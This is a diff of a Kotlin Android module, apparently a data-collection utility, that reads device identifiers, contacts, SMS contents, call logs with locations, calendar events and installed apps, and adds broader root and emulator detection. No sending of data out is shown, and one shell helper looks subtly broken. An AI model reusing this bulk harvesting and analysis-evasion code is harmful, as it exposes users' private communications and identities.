@@ -1,5 +1,5 @@
 @file:Suppress("PrivateApi", "ObsoleteSdkInt", "MissingPermission", "HardwareIds", "NewApi", "DEPRECATION")
-@file:OptIn(DelicateCoroutinesApi::class, ExperimentalPathApi::class)
+@file:OptIn(DelicateCoroutinesApi::class, ExperimentalPathApi::class, ExperimentalStdlibApi::class)
 
 package com.example.infotest
 
@@ -35,9 +35,12 @@ import androidx.core.content.ContentResolverCompat
 import androidx.core.content.ContextCompat
 import androidx.core.content.getSystemService
 import androidx.core.content.pm.PackageInfoCompat
+import androidx.core.database.getBlobOrNull
 import androidx.core.database.getDoubleOrNull
+import androidx.core.database.getFloatOrNull
 import androidx.core.database.getIntOrNull
 import androidx.core.database.getLongOrNull
+import androidx.core.database.getShortOrNull
 import androidx.core.database.getStringOrNull
 import androidx.core.os.CancellationSignal
 import androidx.core.os.ConfigurationCompat
@@ -131,7 +134,7 @@ inline fun <reified T: Any> (() -> T?).catchReturn(defaultValue: T): T {
 }
 
 @OptIn(ExperimentalContracts::class)
-inline fun <reified T> (() -> T).catchReturnNull(): T? {
+inline fun <reified T> (() -> T).catchReturnNull(defaultValue: T? = null): T? {
     contract {
         callsInPlace(this@catchReturnNull, InvocationKind.EXACTLY_ONCE)
     }
@@ -139,7 +142,7 @@ inline fun <reified T> (() -> T).catchReturnNull(): T? {
     return try {
         invoke()
     } catch (_: Exception) {
-        null
+        defaultValue
     }
 }
 fun (() -> String?).catchEmpty() = catchReturn("")
@@ -576,9 +579,8 @@ private fun Context.getGeneralData(): GeneralData {
         currentSystemTime = currentNetworkTimeInstant.toEpochMilli().toString(),
         elapsedRealtime = SystemClock.elapsedRealtime().toString(),
         gaid = GlobalApplication.gaid.orEmpty(),
-        imei = {
-            telephonyManager?.let { TelephonyManagerCompat.getImei(it) }
-        }.catchReturn(Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID).orEmpty()),
+        imei = { telephonyManager?.let { TelephonyManagerCompat.getImei(it) } }
+            .catchReturn(Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID).orEmpty()),
         isUsbDebug = (Settings.Global.getInt(contentResolver,
             Settings.Global.ADB_ENABLED, 0) > 0).toString(),
         isUsingProxyPort = {
@@ -613,18 +615,12 @@ private fun Context.getGeneralData(): GeneralData {
         phoneNumber = {
             PhoneNumberUtils.formatNumber((if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && telephonyManager != null)
                 getSystemService<SubscriptionManager>()?.getPhoneNumber(TelephonyManagerCompat.getSubscriptionId(telephonyManager))
-            else telephonyManager?.line1Number)?.takeIf { telephonyManager?.simOperator?.isNotBlank() == true }.orEmpty(), Locale.getDefault().country).orEmpty()
+            else telephonyManager?.line1Number)?.takeIf { telephonyManager?.simOperator?.isNotBlank() == true }.orEmpty(), locale.country)
         }.catchEmpty(),
         phoneType = { telephonyManager?.phoneType }.catchReturn(TelephonyManager.PHONE_TYPE_NONE),
         sensor = {
             getSystemService<SensorManager>()?.let { manager ->
-                manager.getSensorList(Sensor.TYPE_ALL).plus(manager.getDynamicSensorList(Sensor.TYPE_ALL)).distinctBy {
-                    when (it.id) {
-                        0 -> it.hashCode()
-                        -1 -> (it.type to it.name).hashCode()
-                        else -> it.id
-                    }
-                }.mapNotNull {
+                manager.getSensorList(Sensor.TYPE_ALL).mapNotNull {
                     Sensor(
                         maxRange = it.maximumRange.toString(),
                         minDelay = it.minDelay.toString(),
@@ -771,9 +767,9 @@ private fun Context.getStorageInfo(): Storage {
         }
     }
     return Storage(
-        appFreeMemory = try { Runtime.getRuntime().freeMemory().toString() } catch (e: Exception) { "" },
-        appMaxMemory = try { Runtime.getRuntime().maxMemory().toString() } catch (e: Exception) { "" },
-        appTotalMemory = try { Runtime.getRuntime().totalMemory().toString() } catch (e: Exception) { "" },
+        appFreeMemory = { Runtime.getRuntime().freeMemory().toString() }.catchEmpty(),
+        appMaxMemory = { Runtime.getRuntime().maxMemory().toString() }.catchEmpty(),
+        appTotalMemory = { Runtime.getRuntime().totalMemory().toString() }.catchEmpty(),
         containSd = {
             (Environment.getExternalStorageState() in listOf(Environment.MEDIA_MOUNTED,
                 Environment.MEDIA_MOUNTED_READ_ONLY)).toInt()
@@ -817,75 +813,85 @@ private fun Context.getOtherData(): OtherData = OtherData(
 )
 
 private fun Context.getIsRooted() = {
-    val value1 = (Build.TAGS != Build.UNKNOWN) && Build.TAGS.contains("test-keys")
-    val value2 = arrayOf("/system/bin/", "/system/xbin/", "/sbin/", "/system/sd/xbin/",
+    (Build.TAGS != Build.UNKNOWN) && Build.TAGS.contains("test-keys") ||
+    arrayOf("/system/bin/", "/system/xbin/", "/sbin/", "/system/sd/xbin/",
         "/system/bin/failsafe/", "/data/local/xbin/", "/data/local/bin/",
         "/data/local/", "/system/sbin/", "/usr/bin/", "/vendor/bin/"
     ).any { Paths.get(it, "su").exists(LinkOption.NOFOLLOW_LINKS) ||
-            Paths.get("/system/app/Superuser.apk").exists(LinkOption.NOFOLLOW_LINKS) }
-    val value3 = {
-        Runtime.getRuntime().exec(arrayOf("/system/xbin/which", "su"))
-            .inputStream.use { it.available() > 0 }
-    }.catchFalse()
-    value1 || value2 || value3
+            Paths.get("/system/app/Superuser.apk").exists(LinkOption.NOFOLLOW_LINKS) } ||
+    { Runtime.getRuntime().exec(arrayOf("/system/xbin/which", "su"))
+        .inputStream.use { it.available() > 0 } }.catchFalse()
 }.catchFalse().toInt()
 
 private fun Context.getIsSimulator() = {
     (Build.FINGERPRINT.startsWith("google/sdk_gphone_")
-                && Build.FINGERPRINT.endsWith(":user/release-keys")
-                && Build.MANUFACTURER == "Google" && Build.PRODUCT.startsWith("sdk_gphone_") && Build.BRAND == "google"
-                && Build.MODEL.startsWith("sdk_gphone_"))
+            && Build.FINGERPRINT.endsWith(":user/release-keys")
+            && Build.MANUFACTURER == "Google" && Build.PRODUCT.startsWith("sdk_gphone_") && Build.BRAND == "google"
+            && Build.MODEL.startsWith("sdk_gphone_"))
         || getSystemService<TelephonyManager>()?.networkOperatorName?.equals("android", true) == true
+        // https://stackoverflow.com/a/2923743
+        || getSystemService<TelephonyManager>()?.deviceSoftwareVersion == null
+        || (getSystemService<SensorManager>()?.getSensorList(Sensor.TYPE_ALL)?.size ?: -1) <= 7
         //
-        || Build.FINGERPRINT.startsWith("generic")
-        || Build.FINGERPRINT.startsWith("unknown")
-        || Build.MODEL.contains("google_sdk")
-        || Build.MODEL.contains("Emulator")
+        || Build.FINGERPRINT.startsWith("generic") || Build.FINGERPRINT.startsWith("unknown")
+        || Build.FINGERPRINT.contains("ttVM_Hdragon") || Build.FINGERPRINT.contains("vbox86p")
+        || Build.FINGERPRINT == "robolectric"
+        || Build.HARDWARE.contains("goldfish") || Build.HARDWARE.contains("ranchu")
+        || Build.MODEL.contains("google_sdk") || Build.MODEL.contains("Emulator")
         || Build.MODEL.contains("Android SDK built for x86")
         //bluestacks
         || "QC_Reference_Phone" == Build.BOARD && !"Xiaomi".equals(Build.MANUFACTURER, ignoreCase = true) //bluestacks
         || Build.MANUFACTURER.contains("Genymotion")
-        || Build.HOST=="Build2" //MSI App Player
+        || Build.HOST == "Build2" //MSI App Player
         || Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")
-        || Build.PRODUCT == "google_sdk"
+        || Build.PRODUCT == "google_sdk" || Build.PRODUCT == "sdk_gphone64_arm64"
+        || Build.PRODUCT.contains("vbox86p") || Build.PRODUCT.contains("emulator")
+        || Build.PRODUCT.contains("simulator")
+        // https://stackoverflow.com/a/33558819
+        || ContextCompat.registerReceiver(this, null, IntentFilter(Intent.ACTION_BATTERY_CHANGED), ContextCompat.RECEIVER_EXPORTED)
+            ?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1) == 0
+        || arrayOf("/dev/socket/qemud", "/dev/qemu_pipe", "/system/lib/libc_malloc_debug_qemu.so",
+            "/sys/qemu_trace", "/system/bin/qemu-prop").any { Paths.get(it).exists(LinkOption.NOFOLLOW_LINKS) }
+        || execCommand("cat /proc/self/cgroup").isNullOrBlank()
         // another Android SDK emulator check
         || hookSystemPropertiesSimulator()
 }.catchFalse().toInt()
 
+
+private fun execCommand(command: String): String? = execCommand(arrayOf(command))
+private fun execCommand(commands: Array<String>): String? = {
+    Runtime.getRuntime().exec("sh", commands).let { process ->
+        process.waitFor()
+        process.inputStream.readAllBytes().decodeToString()
+    }
+}.catchReturnNull()
+
 private fun Context.getAddressBook(): List<Contact> = { mutableListOf<Contact>().apply {
     contentResolver.queryAll(contentUri = ContactsContract.Contacts.CONTENT_URI, projection = arrayOf(
-        ContactsContract.Contacts._ID,
-        ContactsContract.Contacts.DISPLAY_NAME,
-        ContactsContract.Contacts.LAST_TIME_CONTACTED,
-        ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP,
-        ContactsContract.Contacts.TIMES_CONTACTED,
-        ContactsContract.Contacts.HAS_PHONE_NUMBER
+        ContactsContract.Contacts.LAST_TIME_CONTACTED, ContactsContract.Contacts.DISPLAY_NAME,
+        ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP, ContactsContract.Contacts._ID,
+        ContactsContract.Contacts.TIMES_CONTACTED, ContactsContract.Contacts.HAS_PHONE_NUMBER
     )).use {
         while (it?.moveToNext() == true) {
-            if ((it.getIntOrNull(it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) ?: -1) > 0) {
-                contentResolver.queryAll(contentUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                    projection = arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
-                    selection = "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
-                    selectionArgs = arrayOf(it.getStringOrNull(it.getColumnIndex(ContactsContract.Contacts._ID)))
-                ).use { phoneCursor ->
-                    while (phoneCursor?.moveToNext() == true) {
-                        add(Contact(
-                            name = it.getStringOrNull(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)).orEmpty(),
-                            phoneNumber = phoneCursor.getStringOrNull(phoneCursor.getColumnIndex(
-                                ContactsContract.CommonDataKinds.Phone.NUMBER)).orEmpty(),
-                            lastTimeContacted = it.getLongOrNull(it.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED)),
-                            updateTime = it.getLongOrNull(it.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP)),
-                            timesContacted = it.getIntOrNull(it.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED))
-                        ))
-                    }
-                }
-            } else add(Contact(
+            val contact = Contact(
                 name = it.getStringOrNull(it.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)).orEmpty(),
                 phoneNumber = "",
                 lastTimeContacted = it.getLongOrNull(it.getColumnIndex(ContactsContract.Contacts.LAST_TIME_CONTACTED)),
-                updateTime = it.getLongOrNull(it.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP))?:0L,
+                updateTime = it.getLongOrNull(it.getColumnIndex(ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP)),
                 timesContacted = it.getIntOrNull(it.getColumnIndex(ContactsContract.Contacts.TIMES_CONTACTED))
-            ))
+            )
+            if ((it.getIntOrNull(it.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) ?: -1) > 0) {
+                contentResolver.queryAll(contentUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    projection = arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
+                    selection = arrayOf(ContactsContract.CommonDataKinds.Phone.CONTACT_ID),
+                    selectionArgs = arrayOf(it.getStringOrNull(it.getColumnIndex(ContactsContract.Contacts._ID)))
+                ).use { phoneCursor ->
+                    while (phoneCursor?.moveToNext() == true) {
+                        add(contact.copy(phoneNumber = phoneCursor.getStringOrNull(phoneCursor.getColumnIndex(
+                            ContactsContract.CommonDataKinds.Phone.NUMBER)).orEmpty()))
+                    }
+                }
+            } else add(contact)
         }
     }
 }
@@ -898,15 +904,12 @@ private fun Context.getAppList(): List<App> = {
     else packageManager.getInstalledPackages(if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N)
         PackageManager.MATCH_UNINSTALLED_PACKAGES else PackageManager.GET_UNINSTALLED_PACKAGES)).mapNotNull {
         App(
-            name = try { packageManager.getApplicationLabel(it.applicationInfo).toString().orEmpty() } catch (e: Exception) { "" },
-            packageName = it.packageName,
+            name = { packageManager.getApplicationLabel(it.applicationInfo).toString() }.catchEmpty(),
+            packageName = it.packageName, obtainTime = currentNetworkTimeInstant.epochSecond,
             versionCode = PackageInfoCompat.getLongVersionCode(it).toString(),
-            obtainTime = currentNetworkTimeInstant.epochSecond,
             appType = (it.applicationInfo.flags and ApplicationInfo.FLAG_SYSTEM != 0 ||
                 it.applicationInfo.flags and ApplicationInfo.FLAG_UPDATED_SYSTEM_APP == 0).toInt()?.toString() ?: "0",
-            installTime = it.firstInstallTime,
-            updateTime = it.lastUpdateTime,
-            appVersion = it.versionName.orEmpty()
+            installTime = it.firstInstallTime, updateTime = it.lastUpdateTime, appVersion = it.versionName.orEmpty()
         )
     }
 }.catchEmpty()
@@ -923,17 +926,17 @@ private fun Context.getSmsList() = {
                 add(Sms(
                     otherPhone = it.getStringOrNull(it.getColumnIndex(Telephony.Sms.ADDRESS)).orEmpty(),
                     content = it.getStringOrNull(it.getColumnIndex(Telephony.Sms.BODY)).orEmpty(),
-                    seen = it.getIntOrNull(it.getColumnIndex(Telephony.Sms.SEEN))?:-1,
+                    seen = it.getIntOrNull(it.getColumnIndex(Telephony.Sms.SEEN)) ?: -1,
                     status = when (it.getIntOrNull(it.getColumnIndex(Telephony.Sms.STATUS))) {
                         Telephony.Sms.STATUS_NONE -> -1
                         Telephony.Sms.STATUS_COMPLETE -> 0
                         Telephony.Sms.STATUS_PENDING -> 64
                         Telephony.Sms.STATUS_FAILED -> 128
                         else -> -1 },
-                    time = it.getLongOrNull(it.getColumnIndex(Telephony.Sms.DATE))?:-1L,
+                    time = it.getLongOrNull(it.getColumnIndex(Telephony.Sms.DATE)) ?: -1L,
                     type = if (it.getIntOrNull(it.getColumnIndex(Telephony.Sms.TYPE)) != Telephony.Sms.MESSAGE_TYPE_INBOX) 2 else 1,
                     packageName = packageName,//Telephony.Sms.getDefaultSmsPackage(appCtx).orEmpty(),
-                    read = it.getIntOrNull(it.getColumnIndex(Telephony.Sms.READ))?:-1,
+                    read = it.getIntOrNull(it.getColumnIndex(Telephony.Sms.READ)) ?: -1,
                     subject = it.getStringOrNull(it.getColumnIndex(Telephony.Sms.SUBJECT)).orEmpty()
                 ))
             }
@@ -956,20 +959,16 @@ private fun Context.getCalenderList(): List<Calendar> = {
                         startTime = cursor.getLongOrNull(cursor.getColumnIndex(CalendarContract.Events.DTSTART)) ?: -1L,
                         des = cursor.getStringOrNull(cursor.getColumnIndex(CalendarContract.Events.DESCRIPTION)).orEmpty(),
                         reminders = mutableListOf<Reminder>().apply {
-                            try {
-                                CalendarContract.Reminders.query(contentResolver, id, arrayOf(CalendarContract.Reminders.METHOD,
-                                        CalendarContract.Reminders.MINUTES,
-                                        CalendarContract.Reminders._ID)).use {
+                            CalendarContract.Reminders.query(contentResolver, id, arrayOf(CalendarContract.Reminders.METHOD,
+                                CalendarContract.Reminders.MINUTES, CalendarContract.Reminders._ID)).use {
                                     while (it?.moveToNext() == true) {
-                                        add(Reminder(
-                                            eventId = id,
+                                        add(Reminder(eventId = id,
                                             method = it.getIntOrNull(it.getColumnIndex(CalendarContract.Reminders.METHOD)),
                                             minutes = it.getIntOrNull(it.getColumnIndex(CalendarContract.Reminders.MINUTES)),
                                             reminderId = it.getLongOrNull(it.getColumnIndex(CalendarContract.Reminders._ID)))
                                         )
                                     }
                                 }
-                            } catch (_: Exception) { }
                         })
                     )
                 }
@@ -980,11 +979,11 @@ private fun Context.getCalenderList(): List<Calendar> = {
 
 private fun Context.getCallLog(): List<CallRecords> = {
     mutableListOf<CallRecords>().apply {
-        contentResolver.queryAll(contentUri = CallLog.Calls.CONTENT_URI_WITH_VOICEMAIL,
-            projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.COUNTRY_ISO,
-                CallLog.Calls.FEATURES, CallLog.Calls.TYPE, CallLog.Calls.VIA_NUMBER, CallLog.Calls.LOCATION, CallLog.Calls.GEOCODED_LOCATION), sortOrder = CallLog.Calls.DEFAULT_SORT_ORDER).use {
-            while (it?.moveToNext() == true) {
-                val callRecords = CallRecords(
+        contentResolver.queryAll(contentUri = CallLog.Calls.CONTENT_URI_WITH_VOICEMAIL, projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER,
+            CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.COUNTRY_ISO, CallLog.Calls.FEATURES, CallLog.Calls.TYPE, CallLog.Calls.VIA_NUMBER,
+            CallLog.Calls.LOCATION, CallLog.Calls.GEOCODED_LOCATION), sortOrder = CallLog.Calls.DEFAULT_SORT_ORDER).use {
+            while (it?.moveToNext() == true)
+                add(CallRecords(
                     id = it.getLongOrNull(it.getColumnIndex(CallLog.Calls._ID)) ?: -1L,
                     number = it.getStringOrNull(it.getColumnIndex(CallLog.Calls.NUMBER)).orEmpty(),
                     date = it.getLongOrNull(it.getColumnIndex(CallLog.Calls.DATE)) ?: -1L,
@@ -994,15 +993,13 @@ private fun Context.getCallLog(): List<CallRecords> = {
                     caller = it.getStringOrNull(it.getColumnIndex(CallLog.Calls.VIA_NUMBER)).orEmpty(),
                     countryIso = it.getStringOrNull(it.getColumnIndex(CallLog.Calls.COUNTRY_ISO)).orEmpty(),
                     geocodedLocation = it.getStringOrNull(it.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION)).orEmpty()
-                )
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
+                ).also { callRecord -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
                     contentResolver.queryAll(contentUri = Uri.parse(it.getStringOrNull(it.getColumnIndex(CallLog.Calls.LOCATION))).normalizeScheme(),
                         projection = arrayOf(CallLog.Locations.LATITUDE, CallLog.Locations.LONGITUDE)).use { location ->
-                        callRecords.latitude = location?.getDoubleOrNull(it.getColumnIndex(CallLog.Locations.LATITUDE))
-                        callRecords.longitude = location?.getDoubleOrNull(it.getColumnIndex(CallLog.Locations.LONGITUDE))
-                    }
-                add(callRecords)
-            }
+                            callRecord.latitude = location.getSingleDouble(CallLog.Locations.LATITUDE)
+                            callRecord.longitude = location.getSingleDouble(CallLog.Locations.LONGITUDE)
+                        }
+                })
         }
     }
 }.catchEmpty()
@@ -1012,18 +1009,18 @@ private fun Context.getStoragePair(): Pair<Long, Long> {
     val storageManager = getSystemService<StorageManager>()
     var total = 0L
     var free = 0L
-    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-        try {
+    try {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
             val validVolumes = storageManager?.storageVolumes
                 ?.filter { it.state in listOf(Environment.MEDIA_MOUNTED, Environment.MEDIA_MOUNTED_READ_ONLY) }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 val storageStatsManager = getSystemService<StorageStatsManager>()
                 val volumesUuid = validVolumes?.mapNotNull { volume ->
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) volume.storageUuid
-                    else try {
-                        volume.directoryCompat?.let { storageManager.getUuidForPath(it.toFile()) } ?: volume.uuid.toUUIDorNull()
+                    else {
+                        { volume.directoryCompat?.let { storageManager.getUuidForPath(it.toFile()) } }
+                            .catchReturnNull(volume.uuid.toUUIDorNull())
                     }
-                    catch (_: Exception) { volume.uuid.toUUIDorNull() }
                 }
                 if (volumesUuid.isNullOrEmpty()) {
                     total += storageStatsManager?.getTotalBytes(StorageManager.UUID_DEFAULT) ?: 0L
@@ -1036,14 +1033,7 @@ private fun Context.getStoragePair(): Pair<Long, Long> {
                 total += it?.directoryCompat?.fileStore()?.totalSpace ?: 0L
                 free += it?.directoryCompat?.fileStore()?.usableSpace ?: 0L
             }
-        } catch (e: Exception) {
-            StatFs(Environment.getExternalStorageDirectory().absolutePath).let {
-                total = it.blockCountLong * it.blockSizeLong
-                free = it.freeBlocksLong * it.blockSizeLong
-            }
-        }
-    } else {
-        try {
+        } else {
             val volumeClazz = classLoader.loadClass("android.os.storage.StorageVolume")
             val getPathMethod = volumeClazz.getDeclaredMethod("getPath")
             val getVolumeList = StorageManager::class.java.getDeclaredMethod("getVolumeList")
@@ -1054,11 +1044,11 @@ private fun Context.getStoragePair(): Pair<Long, Long> {
                     free += volumeFile.fileStore().usableSpace
                 }
             }
-        } catch (e: Exception) {
-            StatFs(Environment.getExternalStorageDirectory().absolutePath).let {
-                total = it.blockCountLong * it.blockSizeLong
-                free = it.freeBlocksLong * it.blockSizeLong
-            }
+        }
+    } catch (_: Exception) {
+        StatFs(Environment.getExternalStorageDirectory().absolutePath).let {
+            total = it.blockCountLong * it.blockSizeLong
+            free = it.freeBlocksLong * it.blockSizeLong
         }
     }
     return total to free
@@ -1122,12 +1112,12 @@ fun Context.getUniquePseudoId(): String = UUID.randomUUID().toString()/*try {
 }*/
 
 private fun ContentResolver.queryAll(contentUri: Uri, projection: Array<String>? = null,
-                                   selection: String? = null, selectionArgs: Array<String?>? = null,
+                                   selection: Array<String?>? = null, selectionArgs: Array<String?>? = null,
                                    sortOrder: String? = null, cancellationSignal: CancellationSignal? = null): Cursor?
 = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
     var uri = contentUri
     val bundle = Bundle().apply {
-        selection?.let { putString(ContentResolver.QUERY_ARG_SQL_SELECTION, it) }
+        selection?.joinToString(separator = ", ") { "$it = ?" }?.let { putString(ContentResolver.QUERY_ARG_SQL_SELECTION, it) }
         selectionArgs?.let { putStringArray(ContentResolver.QUERY_ARG_SQL_SELECTION_ARGS, it) }
         sortOrder?.let { putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, it) }
     }
@@ -1141,7 +1131,7 @@ private fun ContentResolver.queryAll(contentUri: Uri, projection: Array<String>?
             uri = MediaStore.setIncludePending(contentUri)
     }
     query(uri, projection, bundle, cancellationSignal?.cancellationSignalObject as android.os.CancellationSignal?)
-} else ContentResolverCompat.query(this, contentUri, projection, selection, selectionArgs, sortOrder, cancellationSignal)
+} else ContentResolverCompat.query(this, contentUri, projection, selection?.joinToString(separator = ", ") { "$it = ?" }, selectionArgs, sortOrder, cancellationSignal)
 
 
 @OptIn(ExperimentalUnsignedTypes::class)
@@ -1151,31 +1141,31 @@ private fun Context.getUniqueMediaDrmID(): String = {
         val md = MessageDigest.getInstance("SHA-256")
         md.update(widevineId)
         md.digest().asUByteArray().joinToString("") { ubyte ->
-            ubyte.toString(radix = 16).padStart(2, '0')
+            ubyte.toHexString()
         }
     }
 }.catchEmpty()
 
 private fun Context.getDeviceIdCompat(): String = {
-        getSystemService<TelephonyManager>()?.let {
-            if (packageManager.hasSystemFeature(PackageManager.FEATURE_TELEPHONY_GSM))
-                TelephonyManagerCompat.getImei(it)
-            else if (packageManager.hasSystemFeature(PackageManager.FEATURE_TELEPHONY_CDMA)) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) it.meid
-                else TelephonyManagerCompat.getImei(it)
-            }
-            else null
+    getSystemService<TelephonyManager>()?.let {
+        if (packageManager.hasSystemFeature(PackageManager.FEATURE_TELEPHONY_GSM))
+            TelephonyManagerCompat.getImei(it)
+        else if (packageManager.hasSystemFeature(PackageManager.FEATURE_TELEPHONY_CDMA)) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) it.meid
+            else TelephonyManagerCompat.getImei(it)
         }
+        else null
+    }
 }.catchEmpty()
 
 private fun Context.getGSFId(): String = {
-    if (GoogleApiAvailabilityLight.getInstance()
-            .isGooglePlayServicesAvailable(this) == ConnectionResult.SUCCESS) {
+    (GoogleApiAvailabilityLight.getInstance()
+            .isGooglePlayServicesAvailable(this) == ConnectionResult.SUCCESS).then(
         contentResolver.queryAll(contentUri = Uri.parse("content://com.google.android.gsf.gservices"),
             projection = arrayOf("android_id")).use {
-            it?.getLongOrNull(it.getColumnIndex("android_id"))?.toULong()?.toString(16).orEmpty()
+                it?.getSingleLong("android_id")?.toULong()?.toHexString().orEmpty()
         }
-    } else ""
+    ).orEmpty()
 }.catchEmpty()
 
 @Throws(SecurityException::class)
@@ -1183,6 +1173,21 @@ private fun TelephonyManager.getImeiCompat(slotIndex: Int): String =
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
         getImei(slotIndex)
     else getDeviceId(slotIndex)
+
+private fun Cursor?.getSingleInt(column: String) = if (this?.moveToFirst() == true)
+    getIntOrNull(getColumnIndex(column)) else null
+private fun Cursor?.getSingleLong(column: String) = if (this?.moveToFirst() == true)
+    getLongOrNull(getColumnIndex(column)) else null
+private fun Cursor?.getSingleString(column: String) = if (this?.moveToFirst() == true)
+    getStringOrNull(getColumnIndex(column)) else null
+private fun Cursor?.getSingleDouble(column: String) = if (this?.moveToFirst() == true)
+    getDoubleOrNull(getColumnIndex(column)) else null
+private fun Cursor?.getSingleFloat(column: String) = if (this?.moveToFirst() == true)
+    getFloatOrNull(getColumnIndex(column)) else null
+private fun Cursor?.getSingleShort(column: String) = if (this?.moveToFirst() == true)
+    getShortOrNull(getColumnIndex(column)) else null
+private fun Cursor?.getSingleBlob(column: String) = if (this?.moveToFirst() == true)
+    getBlobOrNull(getColumnIndex(column)) else null
 
 private fun Context.getWifiMac(): String = {
     (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
@@ -1194,7 +1199,7 @@ private fun Context.getWifiMac(): String = {
 }.catchEmpty()
 
 private fun ByteArray?.formatMac(): String = {
-    takeIf { this?.size == 6 }?.joinToString(separator = ":") { String.format("%02x", it) }
+    takeIf { this?.size == 6 }?.toHexString(HexFormat { bytes.byteSeparator = ":" })
 }.catchEmpty()
 
 private fun Context.hookSystemPropertiesSimulator(): Boolean = {
